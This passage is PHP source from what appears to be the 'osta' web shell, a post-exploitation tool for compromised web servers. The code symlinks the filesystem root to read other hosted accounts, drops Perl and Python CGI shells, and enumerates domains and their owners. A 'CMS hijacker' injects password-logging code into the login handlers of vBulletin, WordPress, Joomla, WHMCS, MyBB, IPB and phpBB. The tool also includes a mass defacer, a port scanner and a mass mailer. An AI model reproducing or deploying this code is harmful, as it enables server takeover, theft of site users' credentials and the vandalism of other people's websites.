	$lines = array();
	$lines = _osta_file('/etc/named.conf');
	if(!$lines){
...
if(isset($_POST['osta2'])&&($_POST['osta2']=='symperl'||$_POST["osta2"]=="sympy")){
	$sympath = ostaMakePwd();
	@mkdir('cgiosta',0755);
	@chdir('cgiosta');
	ostacgihtaccess('cgi');
	...
	$cginame = "symperl.osta";
	$source = $perl;
	$lang = "perl";
	if($_POST["osta2"]=="sympy"){
		$cginame = "pysymlink.osta";
		$source = $py;
		$lang = "python";
	}
	...
	@chmod($cginame,0755);
	echo __pre();
	$resource = ostaEx("{$lang} {$cginame} {$sympath}",false,true,true);
	if(strlen($resource) == 0){
		echo ostaiFrameCreator('cgiosta/'.$cginame);
	}else{
		echo $resource;
	}
}
if(isset($_POST['osta4']) && $_POST['osta4']=='SymFile'){
if(function_exists('symlink')||_osta_can_runCommand(true,true)){
ostaNum(9,10);
echo __pre().'
...
<input type="text" name="symfile" placeholder="Example : osta.txt" size="60"/>
<p><input type="submit" value=" " name="symlink" /></p></form></center>';
$path = $_POST['osta5'];
$symname = $_POST['osta6'];
$solevisible58 = $_POST['osta7'];
if($solevisible58){
$new_name = str_replace(".", "_", basename($symname));
$rand_dir = $new_name.rand(111,9999);
$sym_dir = 'ostasymlinkphp/'.$rand_dir.'/';
@mkdir($sym_dir, 0777, true);
ostacgihtaccess('sym', $sym_dir, $symname);
_osta_symlink("$path","$sym_dir/$symname");
echo __pre();
...
if(isset($_POST['osta2']) && $_POST['osta2']=='symphp'){
$cant_symlink = true;
if(function_exists('symlink')||_osta_can_runCommand(false,false)){
@mkdir('ostasymlink',0777);
ostacgihtaccess('sym','ostasymlink/');
_osta_symlink('/','ostasymlink/root');
...
if(_osta_file_exists("/etc/named.conf") && !_osta_file_exists("/etc/virtual/domainowners") && _osta_file_exists("/etc/valiases/")){
echo "<center>";
$lines = array();
$anony_domains = array();
...
$domains = ostaGetDomains();
$lines = $domains["lines"];
$state = $domains["state"];
$is_posix = function_exists("posix_getpwuid") && function_exists("fileowner");
$can_runcmd = _osta_can_runCommand(false,false);
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="ostasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
foreach($lines as $line){
	...
	if($anonymous){
		...
		if(strlen(trim($domain)) > 2 && $state != "passwd"){
			if(!_osta_file_exists('/etc/valiases/'.$domain, false))continue;
			if($is_posix){
				$user = @posix_getpwuid(@fileowner('/etc/valiases/'.$domain));
				$owner = $user["name"];
			}elseif($can_runcmd){
				$owner = ostaEx("stat -c '%U' /etc/valiases/".$domain,false,false);
			}
		}
	}
	if(!$anonymous){
...
$sole = _osta_file("/etc/virtual/domainowners");
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="ostasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
	...
	if($passwd){
		...
		if(!$site_domains){
			$site_domains = ostaEx("ls /etc/virtual/");
			$site_domains = explode("\n", $site_domains);
			if(!$site_domains){
				$site_domains = _osta_file("/etc/named.conf");
...
if(@$_POST['osta1']=='dumpfile'||@$_POST['osta1']=='droptbl'){
$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
$db->selectdb($_POST['sql_base']);
switch($_POST['charset']){
case "Windows-1251": $db->setCharset('costa1251'); break;
case "UTF-8": $db->setCharset('utf8'); break;
case "KOI8-R": $db->setCharset('koi8r'); break;
case "KOI8-U": $db->setCharset('koi8u'); break;
case "costa866": $db->setCharset('costa866'); break;
}
$json = json_decode($_POST['osta2'],true);
if(count($json['tbl'])>0){
if($_POST['osta1']=='dumpfile'){
...
<input type='hidden' name='a' value=Sql><input type='hidden' name='osta1' value='query'><input type='hidden' name='osta2' value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'UTF-8') ."'>
...
if(@$_POST['osta1'] == 'select'){
$_POST['osta1'] = 'query';
$_POST['osta3'] = $_POST['osta3']?$_POST['osta3']:1;
$db->query('SELECT COUNT(*) as n FROM `'.$_POST['osta2'].'`');
$num = $db->fetch();
$pages = ceil($num['n'] / 30);
echo "<span>".$_POST['osta2']."</span> ({$num['n']} records) Page # <input type=text name='osta3' value=" . ((int)$_POST['osta3']) . ">";
echo " of $pages";
if($_POST['osta3'] > 1)
echo " <a href='javascript:void(0);' onclick=fs('1','[\"".$_POST['osta2']."\",\"".($_POST['osta3']-1)."\"]')>&lt; Prev</a>";
if($_POST['osta3'] < $pages)
echo " <a href='javascript:void(0);' onclick=fs('1','[\"".$_POST['osta2']."\",\"".($_POST['osta3']+1)."\"]')>Next &gt;</a>";
$_POST['osta3']--;
$cache_table = $_POST['osta2'];
if($_POST['type']=='pgsql')
$_POST['osta2'] = 'SELECT * FROM `'.$_POST['osta2'].'` LIMIT 30 OFFSET '.($_POST['osta3']*30);
else
$_POST['osta2'] = 'SELECT * FROM `'.$_POST['osta2'].'` LIMIT '.($_POST['osta3']*30).',30';
echo "<br><br>";
}
if((@$_POST['osta1'] == 'query') && !empty($_POST['osta2'])) {
...
echo('</form>');
if((@$_POST['osta1'] == 'edit') && !empty($_POST['osta2'])){
$data = explode(':',$_POST['osta3']);
...
$fetch['__ostaKEY'] = $data[1];
$fetch['__ostaKEYVAL'] = $data[2];
}else{
$d = __ZGVjb2Rlcg($data[2]);
$fetch = json_decode($d, true);
}
foreach($fetch as $key => $value){
if($key=='__ostaKEY'||$key=='__ostaKEYVAL')continue;
$value = htmlspecialchars($value);
echo("<tr><td>$key</td><td><input name='$key' value='$value' /></td></tr>");
}
echo("</table><input type='hidden' name='__ostaDATA' value='".__ZW5jb2Rlcg(json_encode(($data[1] != '0'?array('__ostaKEY'=>$data[1],'__ostaKEYVAL'=>$data[2]):$fetch)))."'><input type='hidden' name='__ostaTBL' value='{$data[0]}'><input type='submit' value=' '></form>");
}
if((@$_POST['osta1'] == 'update') && !empty($_POST['osta2'])){
$data = json_decode($_POST['osta2'], true);
$ostadata = $data['__ostaDATA'];
$data2 = json_decode(__ZGVjb2Rlcg($ostadata), true);
$keyval = array();
echo ('<p><div class="txtfont">Table:</div> <font color="#0F0">'.$data['__ostaTBL'].'</font></p>');
echo("<form onsubmit='fsu(this);return false;'><table border='1'>");
$set = '';
foreach($data as $key => $value){
if($key=='__ostaTBL'||$key=='__ostaDATA')continue;
if($data2['__ostaKEY']==$key){
$keyval['__ostaKEY'] = $key;
$keyval['__ostaKEYVAL'] = $value;
}
$set .= "`$key` = '".addslashes($value)."',";
$value = htmlspecialchars($value);
echo("<tr><td>$key</td><td><input name='$key' value='$value' /></td></tr>");
}
unset($data['__ostaDATA']);

echo("</table><input type='hidden' name='__ostaDATA' value='".__ZW5jb2Rlcg(json_encode((isset($data2['__ostaKEY'])?array('__ostaKEY'=>$keyval['__ostaKEY'],'__ostaKEYVAL'=>$keyval['__ostaKEYVAL']):$data)))."'><input type='hidden' name='__ostaTBL' value='{$data['__ostaTBL']}'><input type='submit' value=' '></form>");

if(!isset($data2['__ostaKEY'])){
$where = '';
...
$where = "`{$data2['__ostaKEY']}` = '".addslashes($data2['__ostaKEYVAL'])."'";
}
$set = substr($set, 0, -1);
$db->fetch($db->query("UPDATE `{$data['__ostaTBL']}` SET $set WHERE $where"));
if($db->error())
echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
else echo("Success...!");
}
if($_POST['osta1']!='edit'&&$_POST['osta1']!='update'){
echo "<p>Query:</p><form onsubmit='fs(this);return false;'>
<input type='hidden' name='osta1' value='query'/>
<textarea name='query' style='width:100%;height:100px'>";
echo $_POST['osta1']!='loadfile'?htmlspecialchars($_POST['osta2']):'';
...
if(@$_POST['osta1'] == 'loadfile'){
$file = $db->loadFile($_POST['osta2']);
...
function ostaselfrm(){
if(isset($_POST['osta1'])&&$_POST['osta1']=='yes'){
echo(__pre().'<center>');
...
function ostacgishell(){
ostahead();
$div = "";
if(!in_array($_POST['osta1'],array('perl','py'))){
$div = "</div>";
...
if(isset($_POST['osta1'])&&in_array($_POST['osta1'],array('perl','py'))){
@mkdir('cgiosta',0755);
@chdir('cgiosta');
ostacgihtaccess('cgi');
$name = $_POST['osta1'].'.osta';
...
if($_POST['osta1']=='perl'){$code = $perl;}else{$code = $py;}
if(__write_file($name,$code)){
@chmod($name,0755);
echo '<iframe src="'.'cgiosta/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
ostafooter();
...
if($_POST['osta5']!=''){
$db_host=($_POST['osta7']);
$db_username=($_POST['osta3']);
$db_password=($_POST['osta4']);
$db_name=($_POST['osta5']);
$cc_encryption_hash=($_POST['osta6']);
echo __pre();
...
$start = strip_tags($_POST['osta2']);
$end = strip_tags($_POST['osta3']);
$host = strip_tags($_POST['osta4']);
if(isset($_POST['osta4']) && is_numeric($_POST['osta3']) && is_numeric($_POST['osta2'])){
echo __pre();
...
function ostacgihtaccess($m,$d='', $symname=false){
$readme = "";
if($symname){$readme="\nReadmeName ".trim($symname);}
if($m=='cgi'){
$code = "#Coded By Sole Sad & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .osta\nAddHandler cgi-script .osta";
}elseif($m=='sym'){
...
$safe_mode = @ini_get('safe_mode');
if(_osta_can_runCommand(true,false)&&($basedir||$safe_mode)){
...
ostaWriteTocgiapi("basedir.osta",$bash);
$bash_users  = ostaEx("cd ostacgiapi;sh basedir.osta ".$makepwd,false,true,true);
...
if(isset($_POST['osta4'])&&($_POST['osta4'] == '>>')){
$mail_to = $_POST['osta1'];
$mail_from = $_POST['osta2'];
$mail_subject = $_POST['osta3'];
$mail_content = $_POST['osta5'];
$count_mail = (int)$_POST['osta6'];
$mail_attach = $_POST['osta7'];
...
<div class="txtfont">Save Dir: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'osta.zip" size="60"/>
<input type="submit" value=" " name="ziper" />
</form></center></p>';
if(isset($_POST['osta5']) && ($_POST['osta5'] == '>>')){
$dirzip = $_POST['osta3'];
$zipfile = $_POST['osta4'];
if (class_exists('ZipArchive')&&($GLOBALS['sys']!='unix'||!_osta_can_runCommand(true,true))){
...
ostaEx("cd '".addslashes(dirname($zipfile))."';zip -r '".addslashes(basename($zipfile))."' '".addslashes($dirzip)."' > /dev/null &");
...
function ostacmshijacker(){
ostahead();
ostaNum(5,6,7,8,9,10);
...
SaveTo: <input size="50" type="text" name="saveto" value="'.$GLOBALS['cwd'].'osta.txt"></font>
<input type="submit" name="btn" value=" "></form></center><br>';
$cms = $_POST['osta1'];
$saveto = $_POST['osta2'];
$cmspath = $_POST['osta4'];
if(!empty($cms) AND !empty($saveto) AND $_POST['osta4'] AND $_POST['osta3'] == '>>'){
echo __pre();
ostaHijackCms($cms,$cmspath,$saveto);
}
echo '</div>';
ostafooter();
}
function ostaHijackCms($cms,$cmspath,$saveto){
switch($cms){
case "vb":
...
$code='$osta_username = strtolower($vbulletin->GPC["vb_login_username"]);$osta_password = $vbulletin->GPC["vb_login_password"];$osta_file = "{saveto_path}";$sql_query = $db->query_read("SELECT * FROM " . TABLE_PREFIX . "user WHERE `username`=\'" . $osta_username . "\'");while($row = $db->fetch_array($sql_query)){if(strlen($osta_password) > 1 AND strlen($osta_username) > 1){$fp1 = @fopen($osta_file, "a+");@fwrite($fp1, $osta_username . \' : \' .  $osta_password." (" . $row["email"] . ")\n");@fclose($fp1); $f = @file($osta_file);$new = array_unique($f);$fp = @fopen($osta_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
...
$code = '$osta_file="{saveto_path}";$fp = fopen($osta_file, "a+");fwrite($fp, $_POST[\'log\']." : ".$_POST[\'pwd\']." (".($user->user_email).")\n");fclose($fp);$f = @file($osta_file);$new = array_unique($f);$fp = @fopen($osta_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
...
$code = '<?php jimport(\'joomla.user.authentication\');$osta_auth = & JAuthentication::getInstance();$osta_data = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$osta_options = array();$osta_response = $osta_auth->authenticate($osta_data, $osta_options);if($osta_response->status == 1){$osta_file="{saveto_path}";$fp=@fopen($osta_file,"a+");@fwrite($fp, $osta_response->username.":".$_POST[\'passwd\']." ( ".$osta_response->email." )\n");@fclose($fp);$f = @file($osta_file);$new = array_unique($f);$fp = @fopen($osta_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
$code = '<?php if(isset($_POST[\'username\']) AND isset($_POST[\'password\']) AND !empty($_POST[\'username\']) AND !empty($_POST[\'password\'])){if($osta_connect=@mysqli_connect($db_host,$db_username,$db_password,$db_name)){$osta_file = "{saveto_path}";$osta_uname = @$_POST[\'username\'];$osta_pw = @$_POST[\'password\'];if(isset($_POST[\'language\'])){$osta_q = "SELECT * FROM tbladmins WHERE `username` = \'$osta_uname\' AND `password` = \'".md5($osta_pw)."\'";$admin = true;}else{$osta_q = "SELECT * FROM tblclients WHERE `email` = \'$osta_uname\'";$admin = false;}$osta_query = mysqli_query($osta_connect, $osta_q);if(mysqli_num_rows($osta_query) > 0 ){$row = mysqli_fetch_array($osta_query);$allow = true;if(!$admin){$__salt = explode(\':\', $row[\'password\']);$__encPW = md5($__salt[1].$_POST[\'password\']).\':\'.$__salt[1];if($row[\'password\'] == $__encPW){$allow = true;$row[\'username\'] = $row[\'email\'];}else{$allow = false;}}if($allow){$fp = @fopen($osta_file, "a+");@fwrite($fp, $row[\'username\'] . \' : \' .  $osta_pw." (" . $row["email"] . ") : ".($admin ? \'is_admin\' : \'is_user\')."\n");@fclose($fp);$f = @file($osta_file);$new = array_unique($f);$fp = @fopen($osta_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);}}}}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
$code = '$osta_q = $db->query("SELECT `email` FROM ".TABLE_PREFIX."users WHERE `username` = \'".$user[\'username\']."\'");$osta_fetch = $db->fetch_array($osta_q);$osta_file = "{saveto_path}";$fp = @fopen($osta_file, "a+");@fwrite($fp, $user[\'username\']." : ". $user[\'password\']." ( ".$osta_fetch[\'email\']." )\n");@fclose($fp);$f = @file($osta_file);$new = array_unique($f);$fp = @fopen($osta_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);';
...
$code = '$osta_q = $this->DB->buildAndFetch(array(\'select\' => \'email\', \'from\' => \'members\', \'where\' => \'name="\'.$username.\'" OR email="\'.$email.\'"\'));$osta_file = "{saveto_path}";$fp = @fopen($osta_file, "a+");@fwrite($fp, $_POST[\'ips_username\'].\' : \'.$_POST[\'ips_password\'].\' ( \'.$osta_q[\'email\'].\' )\'."\n");@fclose($fp);$f = @file($osta_file);$new = array_unique($f);$fp = @fopen($osta_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
...
$code = '$osta_u = request_var(\'username\', \'\');$osta_p = request_var(\'password\', \'\');if($osta_u != \'\' AND $osta_p != \'\'){$osta_response = $auth->login($osta_u,$osta_p);if($osta_response[\'status\'] == LOGIN_SUCCESS){$osta_file ="{saveto_path}";$fp = @fopen($osta_file, "a+");@fwrite($fp, $osta_u." : ".$osta_p. " ( ".$osta_response[\'user_row\'][\'user_email\']." )\n");@fclose($fp);$f = @file($osta_file);$new = array_unique($f);$fp = @fopen($osta_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
$find = 'case \'login\':';
$code=str_replace('{saveto_path}',$saveto,$code);
$login=$path."/ucp.php";
$evil_login = "\t".$find."\n\t".$code;
...
function osta_StrSearcher($dir,$string,$ext,$e,$arr=array()){
if(@is_dir($dir)){
$files=@scandir($dir);
...
osta_StrSearcher($path,$string,$ext,$e,$results);
$results[] = $path;
}}}}
function ostasearcher(){
ostahead();
...
if(isset($_POST['osta1'])&&$_POST['osta1']=='file'){
...
<div class="txtfont">
Method: <select style="width: 18%;" onclick="osta_searcher_tool(this.value);" name="method"><option value="files">Find All Writable Files</option><option value="dirs">Find All Writable Dirs</option><option value="all">Find All Readable And Writable Files</option></select>
...
osta_Searcher($dir,trim($ext),$method);
}
}
if($_POST['osta1']=='str'){
...
$string = $_POST['osta3'];
$ext = $_POST['osta5'];
if(!empty($string) AND !empty($dir) AND $_POST['osta4'] == '>>'){
echo __pre();
osta_StrSearcher($dir,$string,$ext,$_POST['osta6']);
}
}
echo '</div>';
ostafooter();
}
function ostaMassDefacer(){
ostahead();
ostaNum(5,6,7,8,9,10);
...
if(@is_dir($newfile)){
osta_ReadDir($newfile,$method,$defpage);
}else{
if(!@is_writable($newfile))continue;
if(!@is_readable($newfile))continue;
osta_Rewriter($newfile,$file,$defpage,$method);
}
}
closedir($dh);
...
function osta_ReadDir($dir,$method='',$defpage=''){
...
if($file == '..' || $file == '.')continue;
$newfile=$dir.'/'.$file;
if(@is_readable($newfile)&&@is_dir($newfile))osta_ReadDir($newfile,$method,$defpage);
if(@is_file($newfile)){
if(!@is_readable($newfile))continue;
osta_Rewriter($newfile,$file,$defpage,$method);
}
...
function osta_Rewriter($dir,$file,$defpage,$m='index'){
...
function osta_Create_A_Tag($action,$vals){
$nulls = array();
...
function osta_Searcher($dir, $ext, $method) {
if(@is_readable($dir)){
if($method == 'all')$ext = '*';
if($method == 'dirs')$ext = '*';
...
function ostaiFrameCreator($f,$width='100%',$height='600px'){
...
$this->path = osta_TEMPDIR.'/osta_cookies.txt';
...
if (_osta_file_exists($cookie_file,false)) {
...
function ostaGetConfig(){
$cms = $_POST['osta1'];
$path = trim($_POST['osta2']);
$config = array(
...
if(@is_dir($path)||_osta_is_dir($path)){
$file=$path.$file;
}elseif(@is_file($path)||_osta_is_dir($path,"-e")){
$file=$path;
}else{
return false;
}
...
if(empty($_POST['a']))
if(isset($default_action) && function_exists('osta' . $default_action))
$_POST['a'] = $default_action;
else
$_POST['a'] = 'FilesMan';
if(!empty($_POST['a']) && function_exists('osta' . $_POST['a']))
call_user_func('osta' . $_POST['a']);
exit;
/*
